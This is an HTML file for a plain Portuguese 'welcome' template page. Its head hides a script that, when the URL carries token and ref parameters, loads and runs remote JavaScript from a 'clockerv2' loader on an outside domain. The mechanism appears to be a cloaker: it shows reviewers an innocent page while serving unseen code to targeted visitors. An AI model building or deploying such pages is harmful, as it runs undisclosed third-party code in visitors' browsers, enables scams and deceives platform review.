<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Página de apresentação institucional com informações e destaque de conteúdo.">
  <title>Página de Apresentação</title>

  <script>
    const query = window.location.search;
    const urlParams = new URLSearchParams(query);
    const token = urlParams.get("token");
    const ref = urlParams.get("ref");

    if (token && ref) {
      const s = document.createElement("script");
      s.src = `https://paradisepags.com/clockerv2/load.php?token=${token}&ref=${ref}`;
      document.head.appendChild(s);
    }
  </script>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #333333;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      max-width: 600px;
      padding: 20px;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 0.5em;
    }
    p {
      font-size: 1em;
      line-height: 1.5em;
      color: #555555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bem-vindo à nossa página</h1>
    <p>
      Este é um modelo de página limpa, desenvolvida para fins de apresentação ou testes.  
      Aqui você pode incluir informações sobre sua marca, projeto ou serviço de forma objetiva e sem distrações.
    </p>
  </div>
</body>
</html>
